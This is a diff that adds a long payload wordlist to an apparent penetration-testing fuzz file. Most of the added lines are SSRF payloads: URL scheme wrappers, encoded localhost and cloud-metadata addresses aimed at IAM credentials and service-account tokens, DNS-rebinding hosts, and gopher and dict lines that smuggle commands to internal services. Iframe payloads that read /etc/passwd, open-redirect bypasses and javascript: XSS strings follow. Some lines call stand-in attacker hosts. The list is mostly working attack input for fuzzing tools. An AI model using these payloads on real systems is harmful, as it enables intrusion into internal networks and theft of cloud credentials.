@@ -327,6 +327,2273 @@ C:\boot.ini
 /../../../../../../../../../../../boot.ini%00.html
 /../../../../../../../../../../../boot.ini%00.jpg
 /.../.../.../.../.../
+gopher://
+fd://
+expect://
+ogg://
+tftp://
+dict://
+ftp://
+ssh2://
+file://
+http://
+https://
+imap://
+pop3://
+mailto://
+smtp://
+telnet://
+ASP.NET SSRF Wrappers / URL Schema
+The following wrappers are potentiall expected URL schema wrappers found within ASP.NET environments (gopher legacy only).
+
+gopher://
+ftp://
+file://
+http://
+https://
+Java SSRF Wrappers / URL Schema
+The following wrappers are expected within Java environments, and can be used to potentially exploit LFI vulnerabilities.
+
+ 
+ftp://
+file://
+http://
+https://
+gopher://
+netdoc:///etc/passwd
+netdoc:///etc/hosts
+jar:proto-schema://blah!/
+jar:http://localhost!/
+jar:http://127.0.0.1!/
+jar:http://0.0.0.0!/
+jar:ftp://local-domain.com!/
+NOTE: OpenJDK 8+ Redirects
+It should be noted that OpenJDK 8+ does not follow redirects if the protocols do not match.
+
+cURL SSRF Wrappers / URL Schema
+The following wrappers are expected with environments using cURL.
+
+file:///
+dict://
+sftp://
+ldap://
+tftp://
+gopher://
+ssh://
+http://
+https://
+imap://
+pop3://
+smtp://
+telnet://
+Open Redirect SSRF Bypass
+Open redirects can potentially be used to bypass server side whitelist filtering, by appearing to be from the target domain (which has an increased chance of being whitelisted).
+
+Example:
+
+/foo/bar?vuln-function=http://127.0.0.1:8888/secret
+Basic locahost bypass attempts
+Localhost bypass:
+
+All IPv4: 0
+All IPv6: ::
+All IPv4: 0.0.0.0
+Localhost IPv6: ::1
+All IPv4: 0000
+All IPv4: (Leading zeros): 00000000
+IPv4 mapped IPv6 address: 0:0:0:0:0:FFFF:7F00:0001
+8-Bit Octal conversion: 0177.00.00.01
+32-Bit Octal conversion: 017700000001
+32-Bit Hex conversion: 0x7f000001
+various bypasses:
+
+127.0.0.1:80
+127.0.0.1:443
+127.0.0.1:22
+127.1:80
+0
+0.0.0.0:80
+localhost:80
+[::]:80/
+[::]:25/ SMTP
+[::]:3128/ Squid
+[0000::1]:80/
+[0:0:0:0:0:ffff:127.0.0.1]/thefile
+①②⑦.⓪.⓪.⓪
+127.127.127.127
+127.0.1.3
+127.0.0.0
+2130706433/
+017700000001
+3232235521/
+3232235777/
+0x7f000001/
+0xc0a80014/
+{domain}@127.0.0.1
+127.0.0.1#{domain}
+{domain}.127.0.0.1
+127.0.0.1/{domain}
+127.0.0.1/?d={domain}
+{domain}@127.0.0.1
+127.0.0.1#{domain}
+{domain}.127.0.0.1
+127.0.0.1/{domain}
+127.0.0.1/?d={domain}
+{domain}@localhost
+localhost#{domain}
+{domain}.localhost
+localhost/{domain}
+localhost/?d={domain}
+127.0.0.1%00{domain}
+127.0.0.1?{domain}
+127.0.0.1///{domain}
+127.0.0.1%00{domain}
+127.0.0.1?{domain}
+127.0.0.1///{domain}st:+11211aaa
+st:00011211aaaa
+0/
+127.1
+127.0.1
+1.1.1.1 &@2.2.2.2# @3.3.3.3/
+127.1.1.1:80\@127.2.2.2:80/
+127.1.1.1:80\@@127.2.2.2:80/
+127.1.1.1:80:\@@127.2.2.2:80/
+127.1.1.1:80#\@127.2.2.2:80/
+hosts file bypass attempts
+Enclosed Alphanumeric
+http://⑯⑨。②⑤④。⑯⑨｡②⑤④/
+http://⓪ⓧⓐ⑨｡⓪ⓧⓕⓔ｡⓪ⓧⓐ⑨｡⓪ⓧⓕⓔ:80/
+
+==================SSRF (USE MANUALLY ADDING HESDERS BY REPEATER - INTRUDER FUZZING from payloadallthethings/ssrf) +  use tinyurl(with 127.0 or 169.aws) to bypass internal url validationcheck
+http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ
+List:
+① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿
+latest/user-data
+<img src="echopwn" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
+dotless payload = %E3%80%82
+https://evilsite%E3%80%82com%23Whitlistedsite.com
+http%3A%2F%2Fevil.com
+https://expected-host:fakepassword@evil-host
+https://evil-host#expected-host
+https://expected-host.evil-host
+http://ifconfig.me
+spoofed.redacted.oastify.com
+http://spoofed.burpcollaborator.net
+http://instance-data
+0x7f.1
+< iframe src="http://169.254.169.254/user-data"
+< iframe src="http://2852039166/latest/meta-data/"
+< iframe src="http://[::ffff:a9fe:a9fe]/latest/meta-data/"
+< iframe src="http://[0:0:0:0:0:ffff:a9fe:a9fe]/latest/meta-data"
+< iframe src="http://[0:0:0:0:0:ffff:169.254.169.254]/latest/meta-data/"
+<iframe src="file:///etc/passwd" width="400" height="400">
+<iframe src="file:///c:/windows/win.ini" width="400" height="400">
+<img src="x" onerror="document.write('test')" />
+<script> document.write(window.location) </script>
+<object data="file:///etc/passwd">  
+<portal src="file:///etc/passwd" id=portal>
+<iframe src=file:///etc/passwd></iframe>
+<embed src="file://etc/passwd>" width="400" height="400">
+<style><iframe src=”http://169.254.169.254/latest/meta-data/”>
+<img src='x' onerror='document.write('<iframe src=http://169.254.169.254/latest/user-data></iframe>')'/>&text=&width=500&height=500
+<meta http-equiv="refresh" content="0;url=http://169.254.169.254" />
+169.254.169.254.nip.io
+169-254-169-254.nip.io
+a9fea9fe.nip.io
+Something.google.com.169.254.169.254.nip.io
+www.192-168-0-1.sslip.io
+--1.sslip.io
+http://%5B::%5D:22/
+http://[::]:22/
+http://
+http://[::]
+file:///proc/self/environ
+http://localhost:9001/2018-06-01/runtime/invocation/next
+http://169.254.169.254/latest/dynamic/instance-identity/document
+http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
+http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
+http://192.0.0.192/latest/
+http://192.0.0.192/latest/user-data/
+http://192.0.0.192/latest/meta-data/
+http://192.0.0.192/latest/attributes/
+http://100.100.100.200/latest/meta-data/
+http://100.100.100.200/latest/meta-data/instance-id
+http://100.100.100.200/latest/meta-data/image-id
+http://127.0.0.1:2379/versionhttp://127.0.0.1:2379/v2/keys/?recursive=true
+http://rancher-metadata/
+gopher://localhost:11211/1%0astats%0aquit
+dict://locahost:11211/stats
+ldap://localhost:11211/%0astats%0aquit
+file:d:
+file:/d:
+file:c:
+file:/c:
+file:etc/passwd
+file:///D:/
+file:///d:/
+file:///A:/
+file:///B:/
+file:///C:/
+file:///E:/
+file:///F:/
+file:///G:/
+http://1.1.1.1 &@2.2.2.2# @3.3.3.3/
+http://0/
+http://127.1
+https://0251.254.169.254
+https://0xa9.254.169.254
+https://0251.0376.169.254
+https://0251.0376.0251.0376
+https://0xa9.0xfe.0xa9.0xfe
+https://2852039166
+https://10101001111111101010100111111110
+https://0xa9fea9fe
+https://0xAGbsymemdgSGSfjkyhfhERJDFGFGHssjhysrya9fea9fe
+https://instance-data
+https://169.254.169.254
+http://0251.254.169.254
+http://0xa9.254.169.254
+http://0251.0376.169.254
+http://0251.0376.0251.0376
+http://0xa9.0xfe.0xa9.0xfe
+http://2852039166
+http://127.0.0.1:80
+http://0.0.0.0:80
+http://localhost:80
+http://[::]:80/
+http://localtest.me
+http://customer1.app.localhost.my.company.127.0.0.1.nip.io
+http://mail.ebc.apple.com redirect to 127.0.0.6 == localhost
+http://bugbounty.dod.network redirect to 127.0.0.2 == localhost
+http://127.127.127.127
+http://2130706433/ = http://127.0.0.1
+http://[0:0:0:0:0:ffff:127.0.0.1]
+localhost:+11211aaa
+http://0/
+http://0
+http://127.00.1
+http://127.0.01
+http://0.00.0
+http://0.0.00
+http://127.1.0.1
+http://127.10.1
+http://127.1.01
+http://0177.1
+http://0177.0001.0001
+http://0x0.0x0.0x0.0x0
+http://0000.0000.0000.0000
+http://0x7f.0x0.0x0.0x1
+http://0177.0000.0000.0001
+http://0177.0001.0000..0001
+http://0x7f.0x1.0x0.0x1
+http://0x7f.0x1.0x1
+http://localtest.me
+http://1.1.1.1 &@2.2.2.2# @3.3.3.3/
+http://127.1.1.1:80\@127.2.2.2:80/
+http://127.1.1.1:80\@@127.2.2.2:80/
+http://127.1.1.1:80:\@@127.2.2.2:80/
+http://127.1.1.1:80#\@127.2.2.2:80/
+http://169.254.169.254
+0://evil.com:80;http://google.com:80/
+http://10101001111111101010100111111110
+http://0xa9fea9fe
+http://0xAGbsymemdgSGShERJDFGFGHssjhysrya9fea9fe
+http://instance-data
+http://169.254.169.254
+http://%31%32%37%2E%30%2E%30%2E%31
+http://[%3A%3A%31]
+http://0000000000000:0000:0000:0000:0000:00000000000000:0000:1
+http://0000:0000:0000:0000:0000:0000:0000:0001
+http://0:0:0:0:0:0:0:1
+http://0:0:0:0::0:0:1
+http://172.14263982
+http://0254.0xd9a6ae
+http://0xac.000000000000000000331.0246.174
+http://0331.14263982
+http://00000000000000000000000000000000000000000000000000177.1
+http://01111111000000000000000000000001
+http://2130706433
+http://0xDEADBEEF7f000001
+http://0xBADF00D7f000001
+http://0xDEADC0DE7f000001
+http://0xBADC0DE7f000001
+http://0xBAAAaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa7f000001
+http://0x7f.0x0.0x0.0x1
+http://169.254.169.254
+http://0251.254.169.254
+http://00000000000000000000000000000251.254.169.254
+http://0xa9.254.169.254
+http://0251.0376.169.254
+http://0251.0376.0251.0376
+http://0xa9.0xfe.0xa9.0xfe
+http://2852039166
+http://10101001111111101010100111111110
+http://127.000.000.001
+http://127.0.00000000000000000000000000000000001
+http://127.000000.00000000000000000000000000000000001
+http://0177.000000.00000000000000000000000000000000001
+http://0x7f.000000.00000000000000000000000000000000001
+http://192.168.1
+http://192.0000000168.0000000000001
+http://0300.0000000168.0000000000001
+http://0xc0.0000000168.0000000000001
+http://0xa9fea9fe
+http://0xAGbsymemdgSGShERJDFGFGHssjhysrya9fea9fe
+http://0177.0.0.01
+http://00000000177.000.0.00000001
+http://0177.0.0.0000001
+http://000177.0000.00000.01
+http://0000177.000000000000000000.00000000000.00000000001
+http://00000000000000000000000000000000000000000000000000177.0.0.01
+http://0x7f000001
+http://0x7f.1
+http://127.0x1
+http://127.0.1
+http://+11211aaa
+http://00011211aaaa
+localhost:+11211aaa
+localhost:00011211aaaa
+http://[0:0:0:0:0:ffff:127.0.0.1]
+http://[::ffff:127.0.0.1]
+http://localhost:80
+http://localhost:443
+http://localhost:22
+http://127.0.0.1:80
+http://127.0.0.1:443
+http://127.0.0.1:22
+http://0.0.0.0:80
+http://0.0.0.0:443
+http://0.0.0.0:22
+https://127.0.0.1/
+https://localhost/
+http://[::]:80/
+http://[::]:25/
+http://[::]:22/
+http://[::]:3128/
+http://[0000::1]:80/
+http://[0000::1]:25/
+localtest.me	::1
+localh.st
+http://127.127.127.127
+http://127.0.1.3
+http://127.0.0.0
+http://2130706433/
+http://3232235521/
+http://3232235777/
+http://2852039166/
+http://0177.0.0.1/
+http://o177.0.0.1/
+http://0o177.0.0.1/
+http://q177.0.0.1/
+company.127.0.0.1.nip.io
+http://[0000::1]:22/
+http://[0000::1]:3128/
+http://127.0.0.1/%61dmin
+http://127.0.0.1/%2561dmin
+http://evil$google.com
+http://make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
+http://make-hex-0xA9FEA9FE-rr.1u.ms
+http://make-hex-0x41414141A9FEA9FE-rr.1u.ms
+http://make-ccffffca9feca9fe-rr.1u.ms
+make-file:///etc/passwd-rr.1u.ms
+http://me.requestcatcher.com-rr.1u.ms
+//me.requestcatcher.com-rr.1u.ms
+make-127.1-rr.1u.ms
+http://make-127.1-rr.1u.ms
+https://make-127.1-rr.1u.ms
+make-2130706433-rr.1u.ms
+http://0/
+0.0.0.0
+127.0.0.2
+http://0177.0.0.1/
+http://2130706433/
+http://127.0.1
+http://evil$google.com
+http://3232235521/
+http://3232235777/
+http://2130706433
+https://017700000001
+http://127.1
+spoofed.burpcollaborator.net
+http://spoofed.burpcollaborator.net
+https://spoofed.burpcollaborator.net
+http://spoofed.burpcollaborator.net:80
+jar:http://spoofed.burpcollaborator.net!/
+jar:scheme://domain/path!/ 
+jar:http://127.0.0.1!/
+jar:https://127.0.0.1!/
+jar:ftp://127.0.0.1!/
+make-file://etc/passwd-rr.1u.ms
+file://etc/passwd
+file:///etc/passwd
+file://\/\/etc/passwd
+make-file://\/\/etc/passwd-rr.1u.ms
+http://127.1.1.1:80\@127.2.2.2:80/
+http://127.1.1.1:80\@@127.2.2.2:80/
+http://127.1.1.1:80:\@@127.2.2.2:80/
+http://127.1.1.1:80#\@127.2.2.2:80/
+0://evil.com:80;http://google.com:80/
+http://127.0.0.1:22
+http://127.0.0.1:80
+http://127.0.0.1:443
+dict://<user>;<auth>@<host>:<port>/d:<word>:<database>:<n>
+dict://attacker:11111/
+sftp://evil.com:11111/
+tftp://evil.com:12346/TESTUDPPACKET
+ldap://localhost:11211/%0astats%0aquit
+gopher://<proxyserver>:8080/_GET http://<attacker:80>/x HTTP/1.1%0A%0A
+gopher://<proxyserver>:8080/_POST%20http://<attacker>:80/x%20HTTP/1.1%0ACookie:%20eatme%0A%0AI+am+a+post+body
+netdoc:///etc/passwd
+gopher://localhost:8000/_%00%1A%00%00%0A%00UWSGI_FILE%0C%00/tmp/test.py
+<link rel=attachment href="file:///root/secret.txt">
+http://169.254.169.254/latest/meta-data/
+http://[fd00:ec2::254]/latest/meta-data/
+http://instance-data
+http://169.254.169.254
+http://169.254.169.254.nip.io/
+http://nicob.net/redir6a
+http://nicob.net/redir-http-169.254.169.254:80-
+http://425.510.425.510
+http://2852039166
+http://7147006462
+http://0xA9.0xFE.0xA9.0xFE
+http://0xA9FEA9FE
+http://0x41414141A9FEA9FE
+http://0251.0376.0251.0376
+http://0251.00376.000251.0000376
+http://0251.254.169.254
+http://[::ffff:a9fe:a9fe]
+http://[0:0:0:0:0:ffff:a9fe:a9fe]
+http://[0:0:0:0:0:ffff:169.254.169.254]
+http://[fd00:ec2::254]
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/ami-id
+http://169.254.169.254/latest/meta-data/reservation-id
+http://169.254.169.254/latest/meta-data/hostname
+http://169.254.169.254/latest/meta-data/public-keys/
+http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
+http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key
+http://169.254.169.254/latest/dynamic/instance-identity/document
+http://169.254.169.254/metadata/v1/maintenance
+http://169.254.169.254/latest/dynamic/instance-identity/document
+http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
+http://localhost:9001/2018-06-01/runtime/invocation/next
+http://metadata.google.internal/computeMetadata/v1beta1/
+http://metadata.google.internal/computeMetadata/v1beta1/?recursive=true
+http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token?alt=json
+http://169.254.169.254/metadata/v1/id
+http://169.254.169.254/metadata/v1.json
+http://169.254.169.254/metadata/v1/ 
+http://169.254.169.254/metadata/v1/id
+http://169.254.169.254/metadata/v1/user-data
+http://169.254.169.254/metadata/v1/hostname
+http://169.254.169.254/metadata/v1/region
+http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address
+https://metadata.packet.net/userdata
+http://169.254.169.254/metadata/v1/maintenance
+http://169.254.169.254/openstack
+http://169.254.169.254/2009-04-04/meta-data/
+http://192.0.0.192/latest/
+http://192.0.0.192/latest/user-data/
+http://192.0.0.192/latest/meta-data/
+http://192.0.0.192/latest/attributes/
+http://100.100.100.200/latest/meta-data/
+http://100.100.100.200/latest/meta-data/instance-id
+http://100.100.100.200/latest/meta-data/image-id
+http://127.0.0.1:2379/version
+http://127.0.0.1:2379/v2/keys/?recursive=true
+http://127.0.0.1:2375/v1.24/containers/json
+http://127.0.0.1:2375/v1.24/containers/json
+http://rancher-metadata/
+==================================================== EDIT LOCALHOSTS
+
+Encoding the IP to bypass WAF 
+http://425.510.425.510 Dotted decimal with overflow
+http://2852039166 Dotless decimal
+http://7147006462 Dotless decimal with overflow
+http://0xA9.0xFE.0xA9.0xFE Dotted hexadecimal
+http://0xA9FEA9FE Dotless hexadecimal
+http://0x41414141A9FEA9FE Dotless hexadecimal with overflow
+http://0251.0376.0251.0376 Dotted octal
+http://0251.00376.000251.0000376 Dotted octal with padding
+http://0251.254.169.254 Mixed encoding (dotted octal + dotted decimal)
+http://[::ffff:a9fe:a9fe] IPV6 Compressed
+http://[0:0:0:0:0:ffff:a9fe:a9fe] IPV6 Expanded
+http://[0:0:0:0:0:ffff:169.254.169.254] IPV6/IPV4
+http://[fd00:ec2::254] IPV6
+================================================= Zseano
+http://me.requestcatcher.com-rr.1u.ms
+\/yoururl.com
+\/\/yoururl.com
+\\yoururl.com
+//yoururl.com
+//theirsite@yoursite.com
+/\/yoursite.com
+https://yoursite.com%3F.theirsite.com/
+https://yoursite.com%2523.theirsite.com/
+https://yoursite?c=.theirsite.com/
+https://yoursite.com#.theirsite.com/
+https://yoursite.com\.thersite.com/
+//%2F/yoursite.com
+////yoursite.com
+https://theirsite.computer/
+This is when .domain.com* is whitelisted and you can use .computer domain!
+https://theirsite.com.mysite.com
+/%0D/yoursite.com (Also try %09, %00, %0a, %07)
+java%0d%0ascript%0d%0a:alert(0) j%0d%0aava%0d%0aas%0d%0acrip%0d%0at%0d%0a:confirm`0`
+java%07script:prompt`0` java%09scrip%07t:prompt`0`
+/%2F/yoururl.com
+/%5Cyoururl.com
+//google%E3%80%82com
+
+================================================================================================================================================ payloadbox
+/%09/example.com
+/%2f%2fexample.com
+/%2f%2f%2fbing.com%2f%3fwww.omise.co
+/%2f%5c%2f%67%6f%6f%67%6c%65%2e%63%6f%6d/
+/%5cexample.com
+/%68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d
+/.example.com
+//%09/example.com
+//%5cexample.com
+///%09/example.com
+///%5cexample.com
+////%09/example.com
+////%5cexample.com
+/////example.com
+/////example.com/
+////\;@example.com
+////example.com/
+////example.com/%2e%2e
+////example.com/%2e%2e%2f
+////example.com/%2f%2e%2e
+////example.com/%2f..
+////example.com//
+///\;@example.com
+///example.com
+///example.com/
+//google.com/%2f..
+//www.whitelisteddomain.tld@google.com/%2f..
+///google.com/%2f..
+///www.whitelisteddomain.tld@google.com/%2f..
+////google.com/%2f..
+////www.whitelisteddomain.tld@google.com/%2f..
+https://google.com/%2f..
+https://www.whitelisteddomain.tld@google.com/%2f..
+/https://google.com/%2f..
+/https://www.whitelisteddomain.tld@google.com/%2f..
+//www.google.com/%2f%2e%2e
+//www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
+///www.google.com/%2f%2e%2e
+///www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
+////www.google.com/%2f%2e%2e
+////www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
+https://www.google.com/%2f%2e%2e
+https://www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
+/https://www.google.com/%2f%2e%2e
+/https://www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
+//google.com/
+//www.whitelisteddomain.tld@google.com/
+///google.com/
+///www.whitelisteddomain.tld@google.com/
+////google.com/
+////www.whitelisteddomain.tld@google.com/
+https://google.com/
+https://www.whitelisteddomain.tld@google.com/
+/https://google.com/
+/https://www.whitelisteddomain.tld@google.com/
+//google.com//
+//www.whitelisteddomain.tld@google.com//
+///google.com//
+///www.whitelisteddomain.tld@google.com//
+////google.com//
+////www.whitelisteddomain.tld@google.com//
+https://google.com//
+https://www.whitelisteddomain.tld@google.com//
+//https://google.com//
+//https://www.whitelisteddomain.tld@google.com//
+//www.google.com/%2e%2e%2f
+//www.whitelisteddomain.tld@www.google.com/%2e%2e%2f
+///www.google.com/%2e%2e%2f
+///www.whitelisteddomain.tld@www.google.com/%2e%2e%2f
+////www.google.com/%2e%2e%2f
+////www.whitelisteddomain.tld@www.google.com/%2e%2e%2f
+https://www.google.com/%2e%2e%2f
+https://www.whitelisteddomain.tld@www.google.com/%2e%2e%2f
+//https://www.google.com/%2e%2e%2f
+//https://www.whitelisteddomain.tld@www.google.com/%2e%2e%2f
+///www.google.com/%2e%2e
+///www.whitelisteddomain.tld@www.google.com/%2e%2e
+////www.google.com/%2e%2e
+////www.whitelisteddomain.tld@www.google.com/%2e%2e
+https:///www.google.com/%2e%2e
+https:///www.whitelisteddomain.tld@www.google.com/%2e%2e
+//https:///www.google.com/%2e%2e
+//www.whitelisteddomain.tld@https:///www.google.com/%2e%2e
+/https://www.google.com/%2e%2e
+/https://www.whitelisteddomain.tld@www.google.com/%2e%2e
+///www.google.com/%2f%2e%2e
+///www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
+////www.google.com/%2f%2e%2e
+////www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
+https:///www.google.com/%2f%2e%2e
+https:///www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
+/https://www.google.com/%2f%2e%2e
+/https://www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
+/https:///www.google.com/%2f%2e%2e
+/https:///www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
+/%09/google.com
+/%09/www.whitelisteddomain.tld@google.com
+//%09/google.com
+//%09/www.whitelisteddomain.tld@google.com
+///%09/google.com
+///%09/www.whitelisteddomain.tld@google.com
+////%09/google.com
+////%09/www.whitelisteddomain.tld@google.com
+https://%09/google.com
+https://%09/www.whitelisteddomain.tld@google.com
+/%5cgoogle.com
+/%5cwww.whitelisteddomain.tld@google.com
+//%5cgoogle.com
+//%5cwww.whitelisteddomain.tld@google.com
+///%5cgoogle.com
+///%5cwww.whitelisteddomain.tld@google.com
+////%5cgoogle.com
+////%5cwww.whitelisteddomain.tld@google.com
+https://%5cgoogle.com
+https://%5cwww.whitelisteddomain.tld@google.com
+/https://%5cgoogle.com
+/https://%5cwww.whitelisteddomain.tld@google.com
+https://google.com
+https://www.whitelisteddomain.tld@google.com
+javascript:alert(1);
+javascript:alert(1)
+//javascript:alert(1);
+/javascript:alert(1);
+//javascript:alert(1)
+/javascript:alert(1)
+/%5cjavascript:alert(1);
+/%5cjavascript:alert(1)
+//%5cjavascript:alert(1);
+//%5cjavascript:alert(1)
+/%09/javascript:alert(1);
+/%09/javascript:alert(1)
+java%0d%0ascript%0d%0a:alert(0)
+//google.com
+https:google.com
+//google%E3%80%82com
+\/\/google.com/
+/\/google.com/
+//google%00.com
+https://www.whitelisteddomain.tld/https://www.google.com/
+";alert(0);//
+javascript://www.whitelisteddomain.tld?%a0alert%281%29
+http://0xd8.0x3a.0xd6.0xce
+http://www.whitelisteddomain.tld@0xd8.0x3a.0xd6.0xce
+http://3H6k7lIAiqjfNeN@0xd8.0x3a.0xd6.0xce
+http://XY>.7d8T\205pZM@0xd8.0x3a.0xd6.0xce
+http://0xd83ad6ce
+http://www.whitelisteddomain.tld@0xd83ad6ce
+http://3H6k7lIAiqjfNeN@0xd83ad6ce
+http://XY>.7d8T\205pZM@0xd83ad6ce
+http://3627734734
+http://www.whitelisteddomain.tld@3627734734
+http://3H6k7lIAiqjfNeN@3627734734
+http://XY>.7d8T\205pZM@3627734734
+http://472.314.470.462
+http://www.whitelisteddomain.tld@472.314.470.462
+http://3H6k7lIAiqjfNeN@472.314.470.462
+http://XY>.7d8T\205pZM@472.314.470.462
+http://0330.072.0326.0316
+http://www.whitelisteddomain.tld@0330.072.0326.0316
+http://3H6k7lIAiqjfNeN@0330.072.0326.0316
+http://XY>.7d8T\205pZM@0330.072.0326.0316
+http://00330.00072.0000326.00000316
+http://www.whitelisteddomain.tld@00330.00072.0000326.00000316
+http://3H6k7lIAiqjfNeN@00330.00072.0000326.00000316
+http://XY>.7d8T\205pZM@00330.00072.0000326.00000316
+http://[::216.58.214.206]
+http://www.whitelisteddomain.tld@[::216.58.214.206]
+http://3H6k7lIAiqjfNeN@[::216.58.214.206]
+http://XY>.7d8T\205pZM@[::216.58.214.206]
+http://[::ffff:216.58.214.206]
+http://www.whitelisteddomain.tld@[::ffff:216.58.214.206]
+http://3H6k7lIAiqjfNeN@[::ffff:216.58.214.206]
+http://XY>.7d8T\205pZM@[::ffff:216.58.214.206]
+http://0xd8.072.54990
+http://www.whitelisteddomain.tld@0xd8.072.54990
+http://3H6k7lIAiqjfNeN@0xd8.072.54990
+http://XY>.7d8T\205pZM@0xd8.072.54990
+http://0xd8.3856078
+http://www.whitelisteddomain.tld@0xd8.3856078
+http://3H6k7lIAiqjfNeN@0xd8.3856078
+http://XY>.7d8T\205pZM@0xd8.3856078
+http://00330.3856078
+http://www.whitelisteddomain.tld@00330.3856078
+http://3H6k7lIAiqjfNeN@00330.3856078
+http://XY>.7d8T\205pZM@00330.3856078
+http://00330.0x3a.54990
+http://www.whitelisteddomain.tld@00330.0x3a.54990
+http://3H6k7lIAiqjfNeN@00330.0x3a.54990
+http://XY>.7d8T\205pZM@00330.0x3a.54990
+http:0xd8.0x3a.0xd6.0xce
+http:www.whitelisteddomain.tld@0xd8.0x3a.0xd6.0xce
+http:3H6k7lIAiqjfNeN@0xd8.0x3a.0xd6.0xce
+http:XY>.7d8T\205pZM@0xd8.0x3a.0xd6.0xce
+http:0xd83ad6ce
+http:www.whitelisteddomain.tld@0xd83ad6ce
+http:3H6k7lIAiqjfNeN@0xd83ad6ce
+http:XY>.7d8T\205pZM@0xd83ad6ce
+http:3627734734
+http:www.whitelisteddomain.tld@3627734734
+http:3H6k7lIAiqjfNeN@3627734734
+http:XY>.7d8T\205pZM@3627734734
+http:472.314.470.462
+http:www.whitelisteddomain.tld@472.314.470.462
+http:3H6k7lIAiqjfNeN@472.314.470.462
+http:XY>.7d8T\205pZM@472.314.470.462
+http:0330.072.0326.0316
+http:www.whitelisteddomain.tld@0330.072.0326.0316
+http:3H6k7lIAiqjfNeN@0330.072.0326.0316
+http:XY>.7d8T\205pZM@0330.072.0326.0316
+http:00330.00072.0000326.00000316
+http:www.whitelisteddomain.tld@00330.00072.0000326.00000316
+http:3H6k7lIAiqjfNeN@00330.00072.0000326.00000316
+http:XY>.7d8T\205pZM@00330.00072.0000326.00000316
+http:[::216.58.214.206]
+http:www.whitelisteddomain.tld@[::216.58.214.206]
+http:3H6k7lIAiqjfNeN@[::216.58.214.206]
+http:XY>.7d8T\205pZM@[::216.58.214.206]
+http:[::ffff:216.58.214.206]
+http:www.whitelisteddomain.tld@[::ffff:216.58.214.206]
+http:3H6k7lIAiqjfNeN@[::ffff:216.58.214.206]
+http:XY>.7d8T\205pZM@[::ffff:216.58.214.206]
+http:0xd8.072.54990
+http:www.whitelisteddomain.tld@0xd8.072.54990
+http:3H6k7lIAiqjfNeN@0xd8.072.54990
+http:XY>.7d8T\205pZM@0xd8.072.54990
+http:0xd8.3856078
+http:www.whitelisteddomain.tld@0xd8.3856078
+http:3H6k7lIAiqjfNeN@0xd8.3856078
+http:XY>.7d8T\205pZM@0xd8.3856078
+http:00330.3856078
+http:www.whitelisteddomain.tld@00330.3856078
+http:3H6k7lIAiqjfNeN@00330.3856078
+http:XY>.7d8T\205pZM@00330.3856078
+http:00330.0x3a.54990
+http:www.whitelisteddomain.tld@00330.0x3a.54990
+http:3H6k7lIAiqjfNeN@00330.0x3a.54990
+http:XY>.7d8T\205pZM@00330.0x3a.54990
+〱google.com
+〵google.com
+ゝgoogle.com
+ーgoogle.com
+ｰgoogle.com
+/〱google.com
+/〵google.com
+/ゝgoogle.com
+/ーgoogle.com
+/ｰgoogle.com
+%68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d
+http://%67%6f%6f%67%6c%65%2e%63%6f%6d
+<>javascript:alert(1);
+<>//google.com
+//google.com\@www.whitelisteddomain.tld
+https://:@google.com\@www.whitelisteddomain.tld
+\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3aalert(1)
+\u006A\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003aalert(1)
+ja\nva\tscript\r:alert(1)
+\j\av\a\s\cr\i\pt\:\a\l\ert\(1\)
+\152\141\166\141\163\143\162\151\160\164\072alert(1)
+http://google.com:80#@www.whitelisteddomain.tld/
+http://google.com:80?@www.whitelisteddomain.tld/
